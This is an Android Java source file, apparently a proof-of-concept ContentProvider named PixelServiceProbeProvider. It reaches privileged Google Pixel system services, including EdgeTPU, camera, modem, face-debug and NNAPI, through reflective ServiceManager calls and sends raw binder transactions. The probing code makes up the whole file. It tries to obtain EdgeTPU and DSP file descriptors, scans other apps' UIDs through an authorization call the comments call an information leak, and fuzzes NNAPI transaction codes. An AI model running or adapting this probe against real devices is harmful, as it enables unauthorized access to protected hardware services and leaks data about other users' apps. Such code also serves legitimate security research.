package com.poc.crossuser;

import android.content.ContentProvider;
import android.content.ContentValues;
import android.database.Cursor;
import android.database.MatrixCursor;
import android.net.Uri;
import android.os.IBinder;
import android.os.Parcel;
import java.lang.reflect.Method;

public class PixelServiceProbeProvider extends ContentProvider {

    @Override
    public boolean onCreate() { return true; }

    @Override
    public Cursor query(Uri uri, String[] proj, String sel, String[] selArgs, String sort) {
        MatrixCursor cursor = new MatrixCursor(new String[]{"test", "result"});
        cursor.addRow(new Object[]{"uid", String.valueOf(android.os.Process.myUid())});

        String path = uri.getPath();
        if (path != null && path.contains("edgetpu")) {
            deepProbeEdgeTpu(cursor);
        } else if (path != null && path.contains("neuralnet")) {
            probeNeuralNetworks(cursor);
        } else {
            // Default: quick scan all + deep EdgeTPU
            quickScanAll(cursor);
            deepProbeEdgeTpu(cursor);
        }

        return cursor;
    }

    private void quickScanAll(MatrixCursor cursor) {
        String[][] services = {
            {"com.google.pixel.camera.services.binder.IServiceBinder/default", "com.google.pixel.camera.services.binder.IServiceBinder", "cam_bind"},
            {"com.google.pixel.camera.services.cameraidremapper.ICameraIdRemapper/default", "com.google.pixel.camera.services.cameraidremapper.ICameraIdRemapper", "cam_remap"},
            {"com.google.pixel.moseyservice.IMoseyService/default", "com.google.pixel.moseyservice.IMoseyService", "mosey"},
            {"com.google.face.debug.IDebugHost/default", "com.google.face.debug.IDebugHost", "face_dbg"},
            {"com.google.hardware.pixel.display.IDisplay/default", "com.google.hardware.pixel.display.IDisplay", "px_disp"},
            {"com.google.input.ITouchContextService/default", "com.google.input.ITouchContextService", "touch"},
            {"com.google.input.ITwoshayNotificationService/default", "com.google.input.ITwoshayNotificationService", "twoshay"},
            {"com.google.input.algos.gril.IGrilAntennaTuningService/default", "com.google.input.algos.gril.IGrilAntennaTuningService", "gril"},
            {"com.google.input.algos.spd.IScreenProtectorDetectorService/default", "com.google.input.algos.spd.IScreenProtectorDetectorService", "spd"},
            {"com.google.pixel.shared_modem_platform.ISharedModemPlatform/default", "com.google.pixel.shared_modem_platform.ISharedModemPlatform", "modem"},
        };
        for (String[] svc : services) {
            IBinder b = getServiceBinder(svc[0]);
            cursor.addRow(new Object[]{svc[2], b != null ? "ACCESSIBLE" : "NOT_ACCESSIBLE"});
        }
    }

    private void deepProbeEdgeTpu(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("com.google.edgetpu.IEdgeTpuAppService/default");
        if (binder == null) { cursor.addRow(new Object[]{"edgetpu", "NOT_ACCESSIBLE"}); return; }
        String desc = "com.google.edgetpu.IEdgeTpuAppService";
        cursor.addRow(new Object[]{"edgetpu", "ACCESSIBLE uid=" + android.os.Process.myUid()});

        // Interface from symbols (V6):
        // TX=1: getEdgeTpuFd() -> ScopedFileDescriptor
        // TX=2: getDspFd() -> ScopedFileDescriptor
        // TX=3: userIsAuthorized(int uid) -> bool
        // TX=4: getAuthorizedOperators(int uid) -> int[]
        // TX=5: getConverterOpFilterVersion() -> int
        // TX=6: checkDumpPermission(int uid, int pid) -> bool
        // TX=7: mlock(ScopedFileDescriptor fd, IBinder token, long offset, long size, long flags)
        // TX=8: munlock(IBinder token)
        // TX=9: compileTfLiteSubgraph(ScopedFileDescriptor fd, long offset, byte[] key) -> CompilerServiceOutput
        // TX=10: tryReadCompileCache(byte[] key) -> CompilerServiceOutput
        // TX=11: userIsAuthorizedToAccessGXP(int uid) -> bool
        // TX=12: mlockMultiple(IBinder token, MlockRequest[] requests) -> long[]
        // TX=13: munlockMultiple(IBinder token, long[] handles)
        // TX=16777214: getInterfaceVersion() -> int
        // TX=16777213: getInterfaceHash() -> String

        // === TX=1: getEdgeTpuFd() - NO ARGS needed beyond token ===
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            binder.transact(1, data, reply, 0);
            int status = reply.readInt();
            if (status == 0) {
                int remaining = reply.dataAvail();
                cursor.addRow(new Object[]{"getEdgeTpuFd", "SUCCESS! rem=" + remaining});
            } else {
                int remaining = reply.dataAvail();
                cursor.addRow(new Object[]{"getEdgeTpuFd", "st=" + status + " rem=" + remaining});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"getEdgeTpuFd", "ERR:" + e.getClass().getSimpleName()});
        }
        data.recycle();
        reply.recycle();

        // === TX=2: getDspFd() - NO ARGS ===
        data = Parcel.obtain();
        reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            binder.transact(2, data, reply, 0);
            int status = reply.readInt();
            if (status == 0) {
                int remaining = reply.dataAvail();
                cursor.addRow(new Object[]{"getDspFd", "SUCCESS! rem=" + remaining});
            } else {
                cursor.addRow(new Object[]{"getDspFd", "st=" + status + " rem=" + reply.dataAvail()});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"getDspFd", "ERR:" + e.getClass().getSimpleName()});
        }
        data.recycle();
        reply.recycle();

        // === TX=3: userIsAuthorized(int uid) -> bool ===
        int myUid = android.os.Process.myUid();
        int[] uidsToTest = {myUid, 1000, 0, 10000, 1002};
        for (int uid : uidsToTest) {
            data = Parcel.obtain();
            reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeInt(uid);
                binder.transact(3, data, reply, 0);
                int status = reply.readInt();
                if (status == 0) {
                    int boolVal = reply.readInt(); // bool written as int in AIDL
                    cursor.addRow(new Object[]{"userIsAuth_" + uid, "authorized=" + (boolVal != 0)});
                } else {
                    cursor.addRow(new Object[]{"userIsAuth_" + uid, "st=" + status});
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"userIsAuth_" + uid, "ERR:" + e.getClass().getSimpleName()});
            }
            data.recycle();
            reply.recycle();
        }

        // === TX=4: getAuthorizedOperators(int uid) -> int[] ===
        for (int uid : new int[]{myUid, 1000, 0}) {
            data = Parcel.obtain();
            reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeInt(uid);
                binder.transact(4, data, reply, 0);
                int status = reply.readInt();
                if (status == 0) {
                    int remaining = reply.dataAvail();
                    if (remaining >= 4) {
                        int count = reply.readInt();
                        StringBuilder sb = new StringBuilder("count=" + count + " ops=[");
                        for (int i = 0; i < Math.min(count, 20); i++) {
                            if (reply.dataAvail() >= 4) {
                                sb.append(reply.readInt()).append(",");
                            }
                        }
                        sb.append("]");
                        cursor.addRow(new Object[]{"getAuthOps_" + uid, sb.toString()});
                    } else {
                        cursor.addRow(new Object[]{"getAuthOps_" + uid, "OK rem=" + remaining});
                    }
                } else {
                    cursor.addRow(new Object[]{"getAuthOps_" + uid, "st=" + status});
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"getAuthOps_" + uid, "ERR:" + e.getClass().getSimpleName()});
            }
            data.recycle();
            reply.recycle();
        }

        // === TX=5: getConverterOpFilterVersion() -> int ===
        data = Parcel.obtain();
        reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            binder.transact(5, data, reply, 0);
            int status = reply.readInt();
            if (status == 0) {
                int version = reply.readInt();
                cursor.addRow(new Object[]{"getConverterVer", "version=" + version});
            } else {
                cursor.addRow(new Object[]{"getConverterVer", "st=" + status});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"getConverterVer", "ERR:" + e.getClass().getSimpleName()});
        }
        data.recycle();
        reply.recycle();

        // TX=6: checkDumpPermission - SKIPPED, causes OOM crash (large error parcel)
        cursor.addRow(new Object[]{"checkDumpPerm", "SKIP (OOM on transact)"});

        // === TX=11: userIsAuthorizedToAccessGXP(int uid) -> bool ===
        // TX=11 might actually be index 11 in V40, which could be a different method
        // Let's also check the actual error message
        for (int uid : new int[]{myUid, 1000, 0}) {
            data = Parcel.obtain();
            reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeInt(uid);
                binder.transact(11, data, reply, 0);
                int status = reply.readInt();
                if (status == 0) {
                    int boolVal = reply.readInt();
                    cursor.addRow(new Object[]{"gxpAuth_" + uid, "authorized=" + (boolVal != 0)});
                } else {
                    String msg = null;
                    if (reply.dataAvail() > 0) {
                        try { msg = reply.readString(); } catch (Exception ignored) {}
                    }
                    cursor.addRow(new Object[]{"gxpAuth_" + uid, "st=" + status + " msg=" + truncate(msg)});
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"gxpAuth_" + uid, "ERR:" + e.getClass().getSimpleName() + ":" + truncate(e.getMessage())});
            }
            data.recycle();
            reply.recycle();
        }

        // Now the critical test: try to get the EdgeTPU FD by first calling
        // userIsAuthorized to "warm up" the service, then getEdgeTpuFd
        // The status=-8 from getEdgeTpuFd means EX_SERVICE_SPECIFIC
        // Let's read the actual error string
        data = Parcel.obtain();
        reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            binder.transact(1, data, reply, 0);
            int status = reply.readInt();
            String errMsg = null;
            if (status != 0 && reply.dataAvail() > 0) {
                try { errMsg = reply.readString(); } catch (Exception ignored) {}
            }
            cursor.addRow(new Object[]{"getEdgeTpuFd_err", "st=" + status + " msg=" + truncate(errMsg)});
        } catch (Throwable e) {
            cursor.addRow(new Object[]{"getEdgeTpuFd_err", "ERR:" + e.getClass().getSimpleName()});
        }
        data.recycle();
        reply.recycle();

        // Test more UIDs for information leak - try to query UID ranges
        // to determine which apps use the TPU
        int[] testUids = {10000, 10001, 10050, 10100, 10150, 10200, 10250, 10300,
                          10400, 10500, 10524, 10525, 10526, 10527, 10528, 10600};
        StringBuilder uidResults = new StringBuilder();
        for (int uid : testUids) {
            data = Parcel.obtain();
            reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeInt(uid);
                binder.transact(3, data, reply, 0);
                int status = reply.readInt();
                if (status == 0) {
                    int auth = reply.readInt();
                    if (auth != 0) uidResults.append(uid).append("=Y ");
                    else uidResults.append(uid).append("=N ");
                }
            } catch (Exception e) {
                uidResults.append(uid).append("=E ");
            }
            data.recycle();
            reply.recycle();
        }
        cursor.addRow(new Object[]{"uid_auth_scan", uidResults.toString().trim()});

        // getInterfaceVersion/Hash use FLAG_ONEWAY-safe TX codes
        // Use ONE_WAY flag to avoid OOM on large replies
        data = Parcel.obtain();
        reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            binder.transact(16777214, data, reply, 0);
            int status = reply.readInt();
            if (status == 0 && reply.dataAvail() >= 4) {
                int ver = reply.readInt();
                cursor.addRow(new Object[]{"interfaceVer", String.valueOf(ver)});
            } else {
                cursor.addRow(new Object[]{"interfaceVer", "st=" + status});
            }
        } catch (Throwable e) {
            cursor.addRow(new Object[]{"interfaceVer", "ERR:" + e.getClass().getSimpleName()});
        }
        data.recycle();
        reply.recycle();

        data = Parcel.obtain();
        reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            binder.transact(16777213, data, reply, 0);
            int status = reply.readInt();
            if (status == 0) {
                String hash = reply.readString();
                cursor.addRow(new Object[]{"interfaceHash", truncate(hash)});
            } else {
                cursor.addRow(new Object[]{"interfaceHash", "st=" + status});
            }
        } catch (Throwable e) {
            cursor.addRow(new Object[]{"interfaceHash", "ERR:" + e.getClass().getSimpleName()});
        }
        data.recycle();
        reply.recycle();
    }

    private void probeNeuralNetworks(MatrixCursor cursor) {
        // Also probe the Neural Networks HAL (neuralnetworks)
        IBinder binder = getServiceBinder("android.hardware.neuralnetworks.IDevice/google-edgetpu");
        if (binder == null) { cursor.addRow(new Object[]{"nnapi", "NOT_ACCESSIBLE"}); return; }
        String desc = "android.hardware.neuralnetworks.IDevice";
        cursor.addRow(new Object[]{"nnapi", "ACCESSIBLE!"});

        for (int tx = 1; tx <= 15; tx++) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                boolean result = binder.transact(tx, data, reply, 0);
                if (!result) {
                    cursor.addRow(new Object[]{"nn_tx" + tx, "NO_IMPL"});
                } else {
                    int avail = reply.dataAvail();
                    if (avail >= 4) {
                        int status = reply.readInt();
                        int remaining = reply.dataAvail();
                        if (status == 0 && remaining > 0 && remaining < 256) {
                            byte[] raw = new byte[remaining];
                            reply.readByteArray(raw);
                            StringBuilder sb = new StringBuilder();
                            for (int i = 0; i < Math.min(raw.length, 40); i++) {
                                sb.append(String.format("%02x", raw[i]));
                            }
                            cursor.addRow(new Object[]{"nn_tx" + tx, "OK rem=" + remaining + " d=" + sb.toString()});
                        } else {
                            cursor.addRow(new Object[]{"nn_tx" + tx, "st=" + status + " rem=" + remaining});
                        }
                    } else {
                        cursor.addRow(new Object[]{"nn_tx" + tx, "empty"});
                    }
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"nn_tx" + tx, "ERR:" + e.getClass().getSimpleName()});
            }
            data.recycle();
            reply.recycle();
        }
    }

    private String truncate(String s) {
        if (s == null) return "null";
        return s.length() > 100 ? s.substring(0, 100) : s;
    }

    private IBinder getServiceBinder(String name) {
        try {
            Class<?> sm = Class.forName("android.os.ServiceManager");
            Method m = sm.getMethod("getService", String.class);
            return (IBinder) m.invoke(null, name);
        } catch (Exception e) {
            return null;
        }
    }

    @Override public String getType(Uri uri) { return null; }
    @Override public Uri insert(Uri uri, ContentValues values) { return null; }
    @Override public int delete(Uri uri, String sel, String[] selArgs) { return 0; }
    @Override public int update(Uri uri, ContentValues values, String sel, String[] selArgs) { return 0; }
}
